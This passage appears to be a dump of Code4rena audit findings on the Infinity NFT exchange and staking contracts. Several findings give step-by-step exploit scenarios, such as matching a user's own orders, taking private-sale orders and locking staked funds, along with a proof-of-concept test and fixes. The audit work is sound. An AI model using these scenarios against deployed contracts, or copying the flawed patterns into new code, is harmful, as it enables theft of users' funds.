manyMakerOrders.length;     // the below 3 variables are copied to memory once to save on gas     // an SLOAD costs minimum 100 gas where an MLOAD only costs minimum 3 gas     // since these values won't change during function execution, we can save on gas by copying them to memory once     // instead of SLOADing once for each loop iteration     uint16 protocolFeeBps = PROTOCOL_FEE_BPS;     uint32 wethTransferGasUnits = WETH_TRANSFER_GAS_UNITS;     address weth = WETH;     if (makerOrder.isSellOrder) {       for (uint256 i = 0; i < ordersLength; ) {         // 20000 for the SSTORE op that updates maker nonce status from zero to a non zero status         uint256 startGasPerOrder = gasleft() + ((startGas + 20000 - gasleft()) / ordersLength);         _matchOneMakerSellToManyMakerBuys(           makerOrderHash,           makerOrder,           manyMakerOrders[i],           startGasPerOrder,           protocolFeeBps,           wethTransferGasUnits,           weth         );         unchecked {           ++i;         }       }       isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;     } else {       uint256 protocolFee;       for (uint256 i = 0; i < ordersLength; ) {         protocolFee += _matchOneMakerBuyToManyMakerSells(           makerOrderHash,           manyMakerOrders[i],           makerOrder,           protocolFeeBps         );         unchecked {           ++i;         }       }       isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;       uint256 gasCost = (startGas - gasleft() + WETH_TRANSFER_GAS_UNITS) * tx.gasprice;       // if the execution currency is weth, we can send the protocol fee and gas cost in one transfer to save gas       // else we need to send the protocol fee separately in the execution currency       // since the buyer is common across many sell orders, this part can be executed outside the above for loop       // in contrast to the case where if the one order is a sell order, we need to do this in each for loop       if (makerOrder.execParams[1] == weth) {         IERC20(weth).safeTransferFrom(makerOrder.signer, address(this), protocolFee + gasCost);       } else {         IERC20(makerOrder.execParams[1]).safeTransferFrom(makerOrder.signer, address(this), protocolFee);         IERC20(weth).safeTransferFrom(makerOrder.signer, address(this), gasCost);       }     }   } ``` in its executions it calls `InfinityOrderBookComplication.canExecMatchOneToMany()`, `verifyMatchOneToManyOrders()`, `isOrderValid()` to see that if orders are valid and one order matched to all other orders but there is no check for `seller != buyer` in any of those functions. and also `ERC721` and `ERC20` allows funds and assets to be transferred from address to itself. So it's possible for `matchOneToManyOrders()` to match one user sell orders to its buy orders which can cause fund theft or griefing. This is the scenario for fund lose in `matchOneToManyOrders()`: 1. let's assume orders `NFT` ids are for one collection for simplicity. 2. `NFT ID[1]` fair price is `8 ETH` and `NFT ID[2]` fair price is `2 ETH`. 3. `user1` wants to buy `NFT IDs[1,2]` at `10 ETH` (both of them) so he create one buy order and signs it. 4. `user1` wants to sell `NFT ID[1]` at `2.5 ETH` and sell `NFT ID[2]` at `8.5 ETH`. and he wants to sell them immediately after buying them so he create this two sell orders and sign them. 5. `attacker` who has `NFT ID[1]` creates an sell order for it at `7.5 ETH` and signs it. 6. off-chain machining engine sends this orders to `matchOneToManyOrders()`: many orders = [`(attacker sell ID[1] at 7.5 ETH)` , `(user1 sell ID[1] at 2.5 ETH)`] , one order = `(user1 buy IDs[1,2] at 10ETH)` 7. function `matchOneToManyOrders()` logic will check orders and their matching and all the checks would be passed for matching one order to many order(becase tokens lists intersects and numTokens are valids too (`1+1=2`)) 8. function `matchOneToManyOrders()` would execute order and transfer funds and tokens which would result in: (transferring `7.5 ETH` from `user 1` to `attacker`) (transferring `2.5 ETH` from `user1` to `user1`) (transferring `NFT ID[1]` from `attacker` to `user1`) (transferring `NFT ID[1]` from `user1` to `user1`) 9. so in the end contract executed `user1` buy order `(user1 buy IDs[1,2] at 10ETH)` but `user` only received `NFT ID[1]` and didn't received `NFT ID[2]` so contract code perform operation contradiction to what `user1` has been signed.  Of course for this attack to work for `matchOneToManyOrders()` off-chain matching engine need to send wrong data but checks on the contract are not enough.  There are other scenarios for other functions that can cause griefing, for example for function `matchOrders()`: a user can have multiple order to buy some tokens in list of ids. it's possible to match these old orders: 1. `user1` has this order: A:`(user1 BUY 1 of IDs[1,2,3])` and  B:`(user1 BUY 1 of IDs[1,4,5])`  2. then the order B get executed for ID[1] and `user1` become the owner of `ID[1]` 3. `user1` wants to sell some of his tokens so he signs this order: C::`(user1 SELL 1 of IDs[1,6,7])` 4. matching engine would send order A and C with `constructedNfts=ID[1]` to `matchOrders()`. 5. `matchOrders()` would check conditions and would see that conditions are met and perform the transaction. 6. `user1` would pay some unnecessary order fee and it would become like griefing and DOS attack for him.  There may be other scenarios for this vuln to be harmful for users.  ## Tools Used VIM  ## Recommended Mitigation Steps add some checks to ensure that `seller != buyer`   "}, {"title": "Malicious governance can use `updateWethTranferGas` to steal WETH from buyers", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/127", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2022-06-infinity-findings", "body": "Malicious governance can use `updateWethTranferGas` to steal WETH from buyers"}, {"title": "Missing Complication check in `takeMultipleOneOrders`", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/125", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-infinity-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L300-L328   # Vulnerability details  An order's type and it's rules are defined in it's `Complication`. Not checking it would allow anyone to take any orders regardless of their Complication's rule, causing unexpected execution for order makers.  `takeMultipleOneOrders` assumes that all `makerOrders` are simple orderbook orders and the  Complication check is missing here.  #### Proof of Concept - Alice signs a makerOrder with `PrivateSaleComplication`, allowing only Bob to take the private sale order. - A malicious trader calls `takeMultipleOneOrders` to take Alice's order, despite the Complication only allowing Bob to take it.  #### Recommended Mitigation Steps Add `canExecTakeOneOrder` function in IComplication.sol and implement it in `InfinityOrderBookComplication` (and future Complications) to support `takeMultipleOneOrders` operation, then modify `takeMultipleOneOrders` to use the check: ``` function takeMultipleOneOrders() {     ...     for (uint256 i = 0; i < numMakerOrders; ) {         bytes32 makerOrderHash = _hash(makerOrders[i]);         bool makerOrderValid = isOrderValid(makerOrders[i], makerOrderHash);         bool executionValid = IComplication(makerOrders[i].execParams[0]).canExecTakeOneOrder(makerOrders[i]);                  require(makerOrderValid && executionValid, 'order not verified');                  require(currency == makerOrders[i].execParams[1], 'cannot mix currencies');         require(isMakerSeller == makerOrders[i].isSellOrder, 'cannot mix order sides');         uint256 execPrice = _getCurrentPrice(makerOrders[i]);         totalPrice += execPrice; // @audit-issue missing complication check         _execTakeOneOrder(makerOrderHash, makerOrders[i], isMakerSeller, execPrice);         unchecked {             ++i;         }     }     ... } ```  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/124", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "InfinityStaker Pausable contract implemented incorrectly", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/122", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-infinity-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L67 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L86-L90 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L116    # Vulnerability details  ## Impact `InfinityStaker.sol` implemented Pausable contract, but there's no functionality added to `pause` and `unpause` the contract. If any attacker finds a way to exploit the contract and it's funds, at that time it will not let you pause the contract and funds can be lost.  ## Proof of Concept `InfinityStaker.sol` inhereted `Pausable.sol` of `Openzeppelin` and used `whenNotPaused` modifier for `stake()`, `unstake()` and `changeDuration()`,        function _pause() internal virtual whenNotPaused {         _paused = true;         emit Paused(_msgSender());      }   `_pause()` and `_unpause()` function of `Pausable.sol` used to `pause` and `unpause` the contract respectively and both has `internal` visibility, to use these functions it needs to access from the `infinityStaker.sol` internally.  ## Tools Used Manual Analysis  ## Recommended Mitigation Steps add `pause` and `unpause` the contract function to `InfinityStaker.sol`  "}, {"title": "Incorrect condition marks valid order as invalid", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/120", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-06-infinity-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityOrderBookComplication.sol#L140   # Vulnerability details  ## Impact canExecMatchOrder is having an incorrect check which makes a valid order as invalid. doItemsIntersect function is also checked on sell.nfts, buy.nfts which is incorrect. doItemsIntersect should only be checked in reference to constructedNfts  ## Proof of Concept 1. Assume buy has nfts {A,B,C}, sell has nft {A,B}, constructedNfts has nft {A}, buy.constraints[0]/sell.constraints[0]/numConstructedItems is 1  2. Ideally this order should match since constructedNfts {A} is present in both buy and sell  3. But this will not match since doItemsIntersect(sell.nfts, buy.nfts) will fail because of item C which is not present in sell  ## Recommended Mitigation Steps Remove doItemsIntersect(sell.nfts, buy.nfts) from InfinityOrderBookComplication.sol#L140  "}, {"title": "Admin can force users to remain staked", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/117", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-infinity-findings", "body": "Admin can force users to remain staked"}, {"title": "_updateUserStakedAmounts() is not setting userstakedAmounts[user][].timestamp=0 when amount if 0 in some cases", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/116", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-infinity-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L287-L325   # Vulnerability details  ## Impact function `_updateUserStakedAmounts()` is supposed to update user staked amounts and it sets `userstakedAmounts[user][].timestamp=0` when `userstakedAmounts[user][].amount` is `0x0`. but there are some cases that code logic don't handle them and `amount` become `0x0` and code don't set `timestamp` to `0x0`. so any logic that is depended on `timestamp==0` when `amount==0` could fail, to my understanding setting `timestamp` is for gas efficiency.  ## Proof of Concept This is `_updateUserStakedAmounts()` code: ```   /** @notice Update user staked amounts for different duration on unstake     * @dev A more elegant recursive function is possible but this is more gas efficient    */   function _updateUserStakedAmounts(     address user,     uint256 amount,     uint256 noVesting,     uint256 vestedThreeMonths,     uint256 vestedSixMonths,     uint256 vestedTwelveMonths   ) internal {     if (amount > noVesting) {       userstakedAmounts[user][Duration.NONE].amount = 0;       userstakedAmounts[user][Duration.NONE].timestamp = 0;       amount = amount - noVesting;       if (amount > vestedThreeMonths) {         userstakedAmounts[user][Duration.THREE_MONTHS].amount = 0;         userstakedAmounts[user][Duration.THREE_MONTHS].timestamp = 0;         amount = amount - vestedThreeMonths;         if (amount > vestedSixMonths) {           userstakedAmounts[user][Duration.SIX_MONTHS].amount = 0;           userstakedAmounts[user][Duration.SIX_MONTHS].timestamp = 0;           amount = amount - vestedSixMonths;           if (amount > vestedTwelveMonths) {             userstakedAmounts[user][Duration.TWELVE_MONTHS].amount = 0;             userstakedAmounts[user][Duration.TWELVE_MONTHS].timestamp = 0;           } else {             userstakedAmounts[user][Duration.TWELVE_MONTHS].amount -= amount;           }         } else {           userstakedAmounts[user][Duration.SIX_MONTHS].amount -= amount;         }       } else {         userstakedAmounts[user][Duration.THREE_MONTHS].amount -= amount;       }     } else {       userstakedAmounts[user][Duration.NONE].amount -= amount;     }   } ``` for example if `amount=noVesting` then code would execute line: `userstakedAmounts[user][Duration.NONE].amount -= amount;` which sets the `userstakedAmounts[user][Duration.NONE].amount` to `0x0` but `userstakedAmounts[user][Duration.NONE].timestamp` won't change. As as in all other logics when `amount` is `0x0` code set `timestamp` to `0x0` too but here that logic is not happening for this cases (amount equal to `noVesting` or `noVesting + vestedThreeMonths` or ...).  ## Tools Used VIM  ## Recommended Mitigation Steps change if conditions from `>` to `>=`, so for equal case the code set `timestamp` to `0x0` too.  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/112", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/110", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/106", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/105", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/103", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/98", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/97", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/96", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/95", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/94", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/90", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "`_transferNFTs()` succeeds even if no transfer is performed", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/87", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-infinity-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1062   # Vulnerability details  ## Impact If an NFT is sold that does not specify support for the ERC-721 or ERC-1155 standard interface, the sale will still succeed. In doing so, the seller will receive funds from the buyer, but the buyer will not receive any NFT from the seller. This could happen in the following cases: 1. a token that claims to be ERC-721/1155 compliant, but fails to implement the `supportsInterface()` function properly. 2. an NFT that follows a standard other than ERC-721/1155 and does not implement their EIP-165 interfaces. 3. a malicious contract that is deployed to take advantage of this behavior.   ## Proof of Concept https://gist.github.com/kylriley/3bf0e03d79b3d62dd5a9224ca00c4cb9  ## Tools Used N/A  ## Recommended Mitigation Steps If neither the ERC-721 nor the ERC-1155 interface is supported the function should revert. An alternative approach would be to attempt a `transferFrom` and check the balance before and after to ensure that it succeeded.  "}, {"title": "InfinityExchange computes gas refunds in a way where the first order's buyer pays less than the later ones", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/82", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-06-infinity-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L149 https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L202 https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L273   # Vulnerability details  ## Impact The way the gas refunds are computed in the InfinityExchange contract, the first orders pay less than the latter ones. This causes a loss of funds for the buyers whose orders came last in the batch.  ## Proof of Concept The issue is that the `startGasPerOrder` variable is computed within the for-loop. That causes the first iterations to be lower than later ones.  Here's an example for the following line: https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L202 To make the math easy we use the following values: ``` startGas = 1,000,000 gasPerOrder = 100,000 (so fulfilling an order costs us 100,000 gas) ordersLength = 10 ```  For the 2nd order we then get: ``` startGasPerOrder = 900,000 + ((1,000,000 + 20,000 - 900,000) / 10) startGasPerOrder = 912,000 ``` For the 9th order we get: ``` startGasPerOrder = 200,000 + ((1,000,000 + 20,000 - 200,000) / 10) startGasPerOrder = 282,000 ```  The `startGasPerOrder` variable is passed through a couple of functions without any modification until it reaches a line like this: https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L231  ```sol uint256 gasCost = (startGasPerOrder - gasleft() + wethTransferGasUnits) * tx.gasprice; ```  There, the actual gas costs for the user are computed.  In our case, that would be:  ``` # 2nd order # gasleft() is 800,00 because we said that executing the order costs ~100,000 gas. At the beginning of the order, it was 900,000 so now it's 800,000. This makes the computation a little more straightforward although it's not 100% correct. gasCost = (912,000 - 800,000 + 50,000) * 1 gasCost = 162,000  # 9th order gasCost = (282,000 - 100,000 + 50,000) * 1 gasCost = 232,000 ```  So the 2nd order's buyer pays `162,000` while the 9th order's buyer pays `232,000`.  As I said the math was dumbed down a bit to make it easier. The actual difference might not be as big as shown here. But, there is a difference.  ## Tools Used none  ## Recommended Mitigation Steps The `startGasPerOrder` variable should be initialized *outside* the for-loop.  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/80", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/78", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "Malicious tokens can be used to grief buyers and cause loss of their WETH balance", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/74", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-06-infinity-findings", "body": "Malicious tokens can be used to grief buyers and cause loss of their WETH balance"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/72", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/71", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/69", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/68", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "Non-Deterministic Nonce Leading to Non Cancellable Orders", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/66", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-infinity-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L375-L402 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L507-L530   # Vulnerability details  ## Impact The current nonce is non-deterministic. This means that at any point in time, it is not possible to say what the current nonce for a given signer is.  **So, there is no way to cancel all pending orders.**  ## Proof of Concept Let's say there was a mass phishing attack on users and some signatures were phished.  Since the user does not know the nonce of the signatures that were signed by him/her, he/she cannot cancel it via `cancelMultipleOrders`.  And there is no way to cancel all pending orders. Since the nonce can be any arbitrary value, if the signature had a UINT256 MAX value, there is no way to cancel it via `cancelAllOrders`.  ## Tools Used VS Code  ## Recommended Mitigation Steps It is recommended to have a deterministic nonce, instead of a non-deterministic nonce. 1. Instead of tracking minNonce, we should track currentNonce. 2. Only allow one increment of the nonce. `cancelAllOrders` should increment the current nonce by 1. 3. Only signatures that match the currentNonce should be considered valid (exactly equal). 4. Instead of canceling orders by nonce, the hash map should be by order hash. So, `isUserOrderNonceExecutedOrCancelled[msg.sender][orderHash]` should be recorded.  If these steps are taken, any such phishing attack can be prevented by simply calling `cancelAllOrders` and incrementing the nonce, because the signature must match the current nonce, and so if the current nonce is incremented by 1, there will be a mismatch and will invalid all pending orders.  Also, specific listings can be canceled by `cancelMultipleOrders` which can check `isUserOrderNonceExecutedOrCancelled[msg.sender][orderHash]`  "}, {"title": "Bug in `MatchOneToManyOrders` may cause tokens theft", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/65", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-06-infinity-findings", "body": "Bug in `MatchOneToManyOrders` may cause tokens theft"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/63", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/62", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/61", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/59", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "Calling `unstake()` can cause locked funds", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/50", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-infinity-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/staking/InfinityStaker.sol#L290-L325   # Vulnerability details  ## Impact Following scenario:  Alice has staked X token for 6 months that have vested. She stakes Y tokens for another three months. If she now calls `unstake(X)` to take out the tokens that have vested, the Y tokens she staked for three months will be locked up.  ## Proof of Concept First, here's a test showcasing the issue:  ```js   describe('should cause trouble', () => {     it('should lock up funds', async function () {       await approveERC20(signer1.address, token.address, amountStaked, signer1, infinityStaker.address);       await infinityStaker.connect(signer1).stake(amountStaked, 2);       await network.provider.send(\"evm_increaseTime\", [181 * DAY]);       await network.provider.send('evm_mine', []);              // The funds we staked for 6 months have vested       expect(await infinityStaker.getUserTotalVested(signer1.address)).to.eq(amountStaked);        // Now we want to stake funds for three months       await approveERC20(signer1.address, token.address, amountStaked2, signer1, infinityStaker.address);       await infinityStaker.connect(signer1).stake(amountStaked2, 1);        // total staked is now the funds staked for three & six months       // total vested stays the same       expect(await infinityStaker.getUserTotalStaked(signer1.address)).to.eq(amountStaked.add(amountStaked2));       expect(await infinityStaker.getUserTotalVested(signer1.address)).to.eq(amountStaked);        // we unstake the funds that are already vested.       const userBalanceBefore = await token.balanceOf(signer1.address);       await infinityStaker.connect(signer1).unstake(amountStaked);       const userBalanceAfter = await token.balanceOf(signer1.address);        expect(userBalanceAfter).to.eq(userBalanceBefore.add(amountStaked));        expect(await infinityStaker.getUserTotalStaked(signer1.address)).to.eq(ethers.BigNumber.from(0));       expect(await infinityStaker.getUserTotalVested(signer1.address)).to.eq(ethers.BigNumber.from(0));     });   }); ```  The test implements the scenario I've described above. In the end, the user got back their `amountStaked` tokens with the `amountStaked2` tokens being locked up in the contract. The user has no tokens staked at the end.  The issue is in the `_updateUserStakedAmounts()` function:  ```sol     if (amount > noVesting) {       userstakedAmounts[user][Duration.NONE].amount = 0;       userstakedAmounts[user][Duration.NONE].timestamp = 0;       amount = amount - noVesting;       if (amount > vestedThreeMonths) {         // MAIN ISSUE:         // here `vestedThreeMonths` is 0. The current staked tokens are set to `0` and `amount` is decreased by `0`.         // Since `vestedThreeMonths` is `0` we shouldn't decrease `userstakedAmounts` at all here.         userstakedAmounts[user][Duration.THREE_MONTHS].amount = 0;         userstakedAmounts[user][Duration.THREE_MONTHS].timestamp = 0;         amount = amount - vestedThreeMonths;         // `amount == vestedSixMonths` so we enter the else block         if (amount > vestedSixMonths) {           userstakedAmounts[user][Duration.SIX_MONTHS].amount = 0;           userstakedAmounts[user][Duration.SIX_MONTHS].timestamp = 0;           amount = amount - vestedSixMonths;           if (amount > vestedTwelveMonths) {             userstakedAmounts[user][Duration.TWELVE_MONTHS].amount = 0;             userstakedAmounts[user][Duration.TWELVE_MONTHS].timestamp = 0;           } else {             userstakedAmounts[user][Duration.TWELVE_MONTHS].amount -= amount;           }         } else {           // the staked amount is set to `0`.           userstakedAmounts[user][Duration.SIX_MONTHS].amount -= amount;         }       } else {         userstakedAmounts[user][Duration.THREE_MONTHS].amount -= amount;       }     } else {       userstakedAmounts[user][Duration.NONE].amount -= amount;     } ```   ## Tools Used none  ## Recommended Mitigation Steps Don't set `userstakedAmounts.amount` to `0` if none of its tokens are removed (`vestedAmount == 0`)  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/47", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "Some real-world NFT tokens may support both ERC721 and ERC1155 standards, which may break `InfinityExchange::_transferNFTs`", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/43", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-infinity-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1062-L1072   # Vulnerability details  ## Impact  Many real-world NFT tokens may support both ERC721 and ERC1155 standards, which may break `InfinityExchange::_transferNFTs`, i.e., transferring less tokens than expected.  For example, the asset token of [The Sandbox Game](https://www.sandbox.game/en/), a Top20 ERC1155 token on [Etherscan](https://etherscan.io/tokens-nft1155?sort=7d&order=desc), supports both ERC1155 and ERC721 interfaces. Specifically, any ERC721 token transfer is regarded as an ERC1155 token transfer with only one item transferred ([token address](https://etherscan.io/token/0xa342f5d851e866e18ff98f351f2c6637f4478db5) and [implementation](https://etherscan.io/address/0x7fbf5c9af42a6d146dcc18762f515692cd5f853b#code#F2#L14)).  Assuming there is a user tries to buy two tokens of Sandbox's ASSETs with the same token id, the actual transferring is carried by `InfinityExchange::_transferNFTs` which first checks ERC721 interface supports and then ERC1155.  ```solidity=   function _transferNFTs(     address from,     address to,     OrderTypes.OrderItem calldata item   ) internal {     if (IERC165(item.collection).supportsInterface(0x80ac58cd)) {       _transferERC721s(from, to, item);     } else if (IERC165(item.collection).supportsInterface(0xd9b67a26)) {       _transferERC1155s(from, to, item);     }   } ```  The code will go into `_transferERC721s` instead of `_transferERC1155s`, since the Sandbox's ASSETs also support ERC721 interface. Then,   ```solidity=   function _transferERC721s(     address from,     address to,     OrderTypes.OrderItem calldata item   ) internal {     uint256 numTokens = item.tokens.length;     for (uint256 i = 0; i < numTokens; ) {       IERC721(item.collection).safeTransferFrom(from, to, item.tokens[i].tokenId);       unchecked {         ++i;       }     }   } ```  Since the `ERC721(item.collection).safeTransferFrom` is treated as an ERC1155 transferring with one item ([reference](https://etherscan.io/address/0x7fbf5c9af42a6d146dcc18762f515692cd5f853b#code#F2#L833)), there is only one item actually gets traferred.  That means, the user, who barely know the implementation details of his NFTs, will pay the money for two items but just got one.  Note that the situation of combining ERC721 and ERC1155 is prevalent and poses a great vulnerability of the exchange contract.     ## Proof of Concept Check the return values of [Sandbox's ASSETs](https://etherscan.io/token/0xa342f5d851e866e18ff98f351f2c6637f4478db5)'s `supportInterface`, both `supportInterface(0x80ac58cd)` and `supportInterface(0xd9b67a26)` return true.   ## Tools Used Manual Inspection  ## Recommended Mitigation Steps Reorder the checks,e.g.,   ```solidity=   function _transferNFTs(     address from,     address to,     OrderTypes.OrderItem calldata item   ) internal {     if (IERC165(item.collection).supportsInterface(0xd9b67a26)) {       _transferERC1155s(from, to, item);     } else if (IERC165(item.collection).supportsInterface(0x80ac58cd)) {       _transferERC721s(from, to, item);     }   } ```   "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/39", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/38", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/35", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/34", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "InfinityStaker: Manipulations of updatePenalties", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/25", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-infinity-findings", "body": "InfinityStaker: Manipulations of updatePenalties"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/21", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/19", "labels": 